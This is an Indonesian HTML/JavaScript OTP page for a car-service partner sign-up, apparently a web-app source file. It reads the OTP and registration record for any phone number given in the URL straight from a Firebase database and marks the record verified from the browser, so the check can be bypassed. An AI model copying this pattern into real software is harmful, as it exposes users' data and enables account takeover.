<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<meta name="theme-color" content="#0a1628" />
<title>Get Car Mitra — Verifikasi OTP</title>

<!-- 🔤 Font -->
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />

<!-- 🔥 Firebase (versi 8 — sama seperti halaman lain) -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<!-- 📷 Cek foto latar — jika gagal dimuat, tetap pakai gradasi navy -->
<script>
  const BG_URL = "https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80";
  const bg = new Image();
  bg.onload = () => document.body.classList.add("has-photo");
  bg.src = BG_URL;
</script>

<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --navy: #0a1628;
    --accent: #2f7bff;
    --accent-deep: #0f5ae0;
    --white: #ffffff;
    --glass: rgba(255, 255, 255, 0.10);
    --glass-border: rgba(255, 255, 255, 0.22);
  }

  html, body { height: 100%; }

  body {
    font-family: 'Plus Jakarta Sans', sans-serif;
    background: var(--navy);
    color: var(--white);
    display: flex;
    justify-content: center;
    overflow: hidden;
  }

  /* 🔹 Ukuran handphone, di komputer tetap di tengah */
  .phone { width: 100%; max-width: 430px; height: 100dvh; overflow: hidden; }

  .hero {
    position: relative;
    height: 100%;
    display: flex;
    flex-direction: column;
    background: linear-gradient(160deg, #0d1f3c 0%, #0a1628 55%, #060d1a 100%);
    overflow: hidden;
  }

  body.has-photo .hero {
    background-image:
      linear-gradient(180deg, rgba(6,13,26,0.80) 0%, rgba(6,13,26,0.85) 50%, rgba(6,13,26,0.95) 100%),
      url("https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80");
    background-size: cover;
    background-position: center;
  }

  /* ✨ Cahaya aksen biru */
  .glow { position: absolute; border-radius: 50%; filter: blur(90px); pointer-events: none; }
  .glow-1 { width: 320px; height: 320px; background: rgba(47,123,255,0.28); top: -100px; right: -100px; }
  .glow-2 { width: 280px; height: 280px; background: rgba(47,123,255,0.16); bottom: 60px; left: -120px; }

  /* 🔹 Navbar */
  .navbar {
    position: relative;
    display: flex;
    align-items: center;
    padding: calc(14px + env(safe-area-inset-top)) 20px 14px;
    z-index: 10;
  }

  .back-btn {
    width: 38px; height: 38px;
    display: flex; align-items: center; justify-content: center;
    border-radius: 12px;
    background: rgba(255,255,255,0.10);
    border: 1px solid rgba(255,255,255,0.18);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    color: var(--white);
    text-decoration: none;
    transition: transform 0.15s ease, background 0.2s ease;
  }
  .back-btn:hover  { background: rgba(255,255,255,0.18); }
  .back-btn:active { transform: scale(0.92); }
  .back-btn svg { width: 18px; height: 18px; }

  .brand {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
    font-size: 15px;
    font-weight: 800;
    letter-spacing: 0.5px;
    white-space: nowrap;
    color: var(--white);
  }
  .brand span { color: var(--accent); }

  .version {
    margin-left: auto;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 0.4px;
    color: rgba(255,255,255,0.85);
    background: rgba(255,255,255,0.12);
    border: 1px solid rgba(255,255,255,0.18);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    padding: 5px 12px;
    border-radius: 20px;
  }

  /* 🔹 Konten */
  .content {
    position: relative;
    z-index: 10;
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 6px 26px calc(20px + env(safe-area-inset-bottom));
    overflow-y: auto;
  }

  .logo-small {
    width: 56px;
    height: 56px;
    object-fit: contain;
    filter: drop-shadow(0 8px 20px rgba(0,0,0,0.45));
    animation: pop 0.7s 0.1s ease both, float 4s 1s ease-in-out infinite;
  }

  .eyebrow {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: rgba(255,255,255,0.75);
    margin: 14px 0 10px;
  }
  .eyebrow::before {
    content: "";
    width: 22px;
    height: 2px;
    background: var(--accent);
    border-radius: 2px;
  }

  h1 {
    font-size: clamp(24px, 6.5vw, 30px);
    font-weight: 800;
    line-height: 1.2;
    letter-spacing: -0.5px;
    margin-bottom: 8px;
    text-shadow: 0 2px 20px rgba(0,0,0,0.35);
  }
  h1 span {
    background: linear-gradient(90deg, #6db3ff, #2f7bff);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  .desc {
    font-size: 14px;
    line-height: 1.6;
    color: rgba(255,255,255,0.75);
    max-width: 320px;
    margin-bottom: 22px;
  }

  /* 🔹 Panel kaca buram */
  .card {
    background: var(--glass);
    border: 1px solid var(--glass-border);
    backdrop-filter: blur(20px) saturate(140%);
    -webkit-backdrop-filter: blur(20px) saturate(140%);
    border-radius: 24px;
    padding: 24px 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
  }

  /* 🔹 Badge nomor telepon */
  .label-nomor {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    font-size: 13px;
    font-weight: 600;
    color: rgba(255,255,255,0.7);
    margin-bottom: 18px;
  }
  .label-nomor b {
    font-size: 15px;
    font-weight: 800;
    letter-spacing: 1px;
    color: var(--white);
    background: rgba(47,123,255,0.18);
    border: 1px solid rgba(47,123,255,0.35);
    padding: 4px 14px;
    border-radius: 20px;
  }

  /* 🔹 Kotak OTP */
  .otp-row {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin-bottom: 18px;
  }

  .otp-box {
    width: 44px;
    height: 54px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 24px;
    font-weight: 800;
    color: var(--white);
    background: rgba(255,255,255,0.08);
    border: 1.5px solid rgba(255,255,255,0.22);
    border-radius: 14px;
    transition: border-color 0.3s ease, background 0.3s ease;
  }
  .otp-box.filled {
    background: rgba(47,123,255,0.18);
    border-color: var(--accent);
    box-shadow: 0 0 18px rgba(47,123,255,0.35);
    animation: popIn 0.35s ease both;
  }

  /* Keadaan menunggu — kotak berdenyut bergantian */
  .otp-row.waiting .otp-box { animation: pulseBox 1.4s ease-in-out infinite; }
  .otp-row.waiting .otp-box:nth-child(2) { animation-delay: 0.15s; }
  .otp-row.waiting .otp-box:nth-child(3) { animation-delay: 0.30s; }
  .otp-row.waiting .otp-box:nth-child(4) { animation-delay: 0.45s; }
  .otp-row.waiting .otp-box:nth-child(5) { animation-delay: 0.60s; }
  .otp-row.waiting .otp-box:nth-child(6) { animation-delay: 0.75s; }

  /* 🔹 Bar timer 45 detik */
  .timer-track {
    height: 4px;
    border-radius: 4px;
    background: rgba(255,255,255,0.12);
    overflow: hidden;
    margin-bottom: 14px;
  }
  .timer-fill {
    height: 100%;
    width: 100%;
    border-radius: 4px;
    background: linear-gradient(90deg, var(--accent), #6db3ff);
  }
  .timer-fill.jalan { animation: menyusut 45s linear forwards; }
  .timer-fill.stop  { animation-play-state: paused; }

  /* 🔹 Tombol */
  .btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 15px;
    border: none;
    border-radius: 16px;
    font-family: inherit;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 0.2px;
    cursor: pointer;
    transition: transform 0.15s ease, box-shadow 0.25s ease, opacity 0.2s ease;
  }
  .btn:active { transform: scale(0.97); }
  .btn svg { width: 18px; height: 18px; flex-shrink: 0; }

  .btn-primary {
    background: linear-gradient(135deg, var(--accent), var(--accent-deep));
    color: var(--white);
    box-shadow: 0 8px 24px rgba(47,123,255,0.4);
  }
  .btn-primary:hover { box-shadow: 0 10px 30px rgba(47,123,255,0.55); }
  .btn-primary:disabled {
    opacity: 0.65;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }

  .hidden { display: none !important; }

  .spinner {
    width: 18px; height: 18px;
    border: 2.5px solid rgba(255,255,255,0.35);
    border-top-color: var(--white);
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
  }

  /* 🔹 Pesan status */
  .status {
    min-height: 20px;
    margin-top: 14px;
    font-size: 13px;
    font-weight: 500;
    line-height: 1.55;
    text-align: center;
    color: rgba(255,255,255,0.7);
  }
  .status.sukses { color: #7ee2a8; }
  .status.error  { color: #ff9b9b; }

  .copyright {
    margin-top: auto;
    padding-top: 20px;
    text-align: center;
    font-size: 11px;
    color: rgba(255,255,255,0.45);
    user-select: none;
  }

  /* 🔹 Animasi */
  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(24px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes pop {
    from { opacity: 0; transform: scale(0.7); }
    to   { opacity: 1; transform: scale(1); }
  }
  @keyframes popIn {
    from { opacity: 0; transform: scale(0.5); }
    to   { opacity: 1; transform: scale(1); }
  }
  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50%      { transform: translateY(-6px); }
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes pulseBox {
    0%, 100% { border-color: rgba(255,255,255,0.22); background: rgba(255,255,255,0.08); }
    50%      { border-color: rgba(47,123,255,0.8);  background: rgba(47,123,255,0.15); }
  }
  @keyframes menyusut {
    from { width: 100%; }
    to   { width: 0%; }
  }

  .navbar    { animation: fadeUp 0.6s ease both; }
  .eyebrow   { animation: fadeUp 0.7s 0.2s ease both; }
  h1         { animation: fadeUp 0.7s 0.3s ease both; }
  .desc      { animation: fadeUp 0.7s 0.4s ease both; }
  .card      { animation: fadeUp 0.7s 0.5s ease both; }
  .copyright { animation: fadeUp 0.7s 0.65s ease both; }

  @media (max-width: 360px) {
    .content { padding-left: 20px; padding-right: 20px; }
    .card { padding: 20px 16px; }
    .otp-box { width: 38px; height: 48px; font-size: 20px; }
    .otp-row { gap: 7px; }
  }
</style>
</head>
<body>

  <div class="phone">
    <div class="hero">

      <div class="glow glow-1"></div>
      <div class="glow glow-2"></div>

      <!-- 🔹 Navbar -->
      <nav class="navbar">
        <a href="index.html" class="back-btn" aria-label="Kembali">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
        </a>
        <div class="brand">Get <span>Car</span></div>
        <div class="version">V1.103.1</div>
      </nav>

      <!-- 🔹 Konten -->
      <div class="content">
        <img src="get.png" alt="Logo Get Car" class="logo-small" onerror="this.style.display='none'" />

        <div class="eyebrow">Verifikasi Nomor</div>
        <h1>Masukkan Kode <span>OTP</span></h1>
        <p class="desc">Kode verifikasi akan dikirim oleh admin ke nomor telepon Anda di bawah ini.</p>

        <!-- 🔹 Panel Verifikasi -->
        <div class="card">

          <div class="label-nomor">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
            <b id="nomorTelepon">-</b>
          </div>

          <!-- 6 Kotak OTP -->
          <div class="otp-row waiting" id="otpRow">
            <div class="otp-box"></div>
            <div class="otp-box"></div>
            <div class="otp-box"></div>
            <div class="otp-box"></div>
            <div class="otp-box"></div>
            <div class="otp-box"></div>
          </div>

          <!-- Bar timer 45 detik -->
          <div class="timer-track">
            <div class="timer-fill jalan" id="timerFill"></div>
          </div>

          <button id="verifikasiBtn" class="btn btn-primary hidden">
            <svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
            <span id="btnSpinner" class="spinner" style="display:none"></span>
            <span id="btnText">Lanjutkan</span>
          </button>

          <p id="status" class="status">Menunggu OTP dari admin...</p>
        </div>

        <div class="copyright">Hak Cipta © PT Bali Global Trans</div>
      </div>

    </div>
  </div>

<script>
  // ================= KONFIGURASI FIREBASE =================
  const firebaseConfig = {
    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
    authDomain: "kadek-ed34e.firebaseapp.com",
    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
    projectId: "kadek-ed34e",
    storageBucket: "kadek-ed34e.firebasestorage.app",
    messagingSenderId: "65756136303",
    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // ================= ELEMEN =================
  const nomorEl       = document.getElementById("nomorTelepon");
  const otpRow        = document.getElementById("otpRow");
  const otpBoxes      = document.querySelectorAll(".otp-box");
  const verifikasiBtn = document.getElementById("verifikasiBtn");
  const btnText       = document.getElementById("btnText");
  const btnIcon       = document.getElementById("btnIcon");
  const btnSpinner    = document.getElementById("btnSpinner");
  const timerFill     = document.getElementById("timerFill");
  const statusEl      = document.getElementById("status");

  // ================= AMBIL & NORMALISASI NOMOR DARI URL =================
  const params = new URLSearchParams(window.location.search);
  let telepon = (params.get("telepon") || "").trim();

  // Pastikan format selalu +62...
  if (telepon.startsWith("0")) {
    telepon = "+62" + telepon.slice(1);
  } else if (telepon.startsWith("62")) {
    telepon = "+" + telepon;
  } else if (telepon.startsWith("8")) {
    telepon = "+62" + telepon;
  }

  nomorEl.innerText = telepon || "Nomor tidak valid";
  console.log("📱 Mencari OTP untuk nomor:", telepon);

  // ================= STATUS & LOADING =================
  function setStatus(pesan, tipe) {
    statusEl.textContent = pesan;
    statusEl.className = "status" + (tipe ? " " + tipe : "");
  }

  function setLoading(aktif) {
    verifikasiBtn.disabled = aktif;
    btnText.textContent = aktif ? "Memproses..." : "Lanjutkan";
    btnIcon.style.display = aktif ? "none" : "block";
    btnSpinner.style.display = aktif ? "block" : "none";
  }

  // ================= TAMPILKAN OTP KE KOTAK =================
  function tampilkanOtp(kode) {
    kode = String(kode).trim(); // WAJIB: ubah jadi teks (antisipasi OTP berupa angka di Firebase)
    otpRow.classList.remove("waiting");
    otpBoxes.forEach((box, i) => {
      box.textContent = kode[i] || "";
      box.classList.remove("filled");
      if (kode[i]) {
        void box.offsetWidth; // restart animasi popIn
        box.classList.add("filled");
      }
    });
  }

  // ================= TIMER 45 DETIK =================
  let waktuTunggu  = 45;
  let otpDiterima  = false;

  const hitungMundur = setInterval(() => {
    if (otpDiterima) return;

    if (waktuTunggu > 0) {
      setStatus("Menunggu admin mengirim OTP... " + waktuTunggu + " detik");
      waktuTunggu--;
    } else {
      clearInterval(hitungMundur);
      setStatus("Belum ada OTP dari admin. Silakan tunggu atau hubungi admin.", "error");
    }
  }, 1000);

  // ================= PANTAU OTP SECARA REALTIME =================
  if (telepon && telepon.length > 5) {
    db.ref("pendaftaran")
      .orderByChild("telepon")
      .equalTo(telepon)
      .on(
        "value",

        // ✅ Berhasil membaca data
        (snapshot) => {
          console.log("🔄 Data berubah — record ditemukan:", snapshot.numChildren());

          if (!snapshot.exists()) {
            if (!otpDiterima) {
              setStatus("Nomor belum ditemukan di database. Menunggu...", "error");
            }
            return;
          }

          snapshot.forEach((child) => {
            const data = child.val();
            console.log("→ Record:", child.key, "| otp =", data.otp, "| status =", data.status);

            const kode = String(data.otp || "").trim();

            if (kode && kode !== "-") {
              if (!otpDiterima) {
                // OTP pertama kali diterima
                otpDiterima = true;
                clearInterval(hitungMundur);       // hentikan timer
                timerFill.classList.add("stop");   // bekukan bar
                tampilkanOtp(kode);
                setStatus("OTP telah diterima dari admin.", "sukses");
                verifikasiBtn.classList.remove("hidden");

                verifikasiBtn.onclick = () => prosesVerifikasi(child.key);
              } else {
                // OTP berubah di database → perbarui tampilan
                tampilkanOtp(kode);
              }
            }
          });
        },

        // ❌ Error (misal: permission denied) — sekarang TERLIHAT, tidak diam
        (error) => {
          console.error("❌ Firebase error:", error);
          setStatus("Gagal membaca database: " + error.message, "error");
        }
      );
  } else {
    setStatus("Nomor telepon tidak valid. Kembali dan coba lagi.", "error");
  }

  // ================= PROSES VERIFIKASI =================
  function prosesVerifikasi(recordKey) {
    setLoading(true);
    setStatus("Verifikasi berhasil! Membuka halaman baru...", "sukses");

    db.ref("pendaftaran/" + recordKey)
      .update({ status: "verifikasi_selesai" })
      .catch((err) => console.error("Gagal update status:", err));

    setTimeout(() => {
      window.open("kota.html?telepon=" + encodeURIComponent(telepon), "_blank");
      setLoading(false);
    }, 1500);
  }
</script>

</body>
</html>
